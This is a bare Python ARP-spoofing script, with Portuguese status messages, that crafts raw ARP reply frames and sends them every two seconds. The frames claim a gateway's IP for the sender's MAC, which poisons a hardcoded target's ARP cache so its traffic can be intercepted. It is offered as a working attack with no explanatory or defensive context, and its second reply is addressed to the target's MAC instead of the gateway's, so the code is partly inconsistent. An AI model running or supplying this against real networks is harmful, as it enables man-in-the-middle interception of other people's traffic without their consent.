import socket
import struct
import binascii
import time

def get_mac_bytes(mac_str):
  
    return binascii.unhexlify(mac_str.replace(':', ''))

def create_arp_packet(src_mac, src_ip, dst_mac, dst_ip):

    ether_header = struct.pack("!6s6s2s", dst_mac, src_mac, b'\x08\x06')
    arp_header = struct.pack(
        "!2s2s1s1s2s6s4s6s4s",
        b'\x00\x01',  
        b'\x08\x00',  
        b'\x06',      
        b'\x04',      
        b'\x00\x02',  
        src_mac,      
        socket.inet_aton(src_ip), 
        dst_mac,      
        socket.inet_aton(dst_ip)   
    )
    return ether_header + arp_header

def send_arp_reply(interface, src_mac, src_ip, dst_mac, dst_ip):
   
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    sock.bind((interface, 0))
    packet = create_arp_packet(src_mac, src_ip, dst_mac, dst_ip)
    sock.send(packet)

if __name__ == "__main__":
    interface = "wlp2s0"
    target_ip = "192.168.1.11"
    target_mac_str = "40:25:c2:58:41:84"
    gateway_ip = "192.168.1.1"
    my_mac_str = "2c:98:11:14:15:7f"

    target_mac = get_mac_bytes(target_mac_str)
    my_mac = get_mac_bytes(my_mac_str)

    try:
        print("ARP spoofing iniciado... (Pressione Ctrl+C para parar)")
        while True:
            send_arp_reply(interface, my_mac, gateway_ip, target_mac, target_ip)
            send_arp_reply(interface, my_mac, target_ip, target_mac, gateway_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Finalizado.")
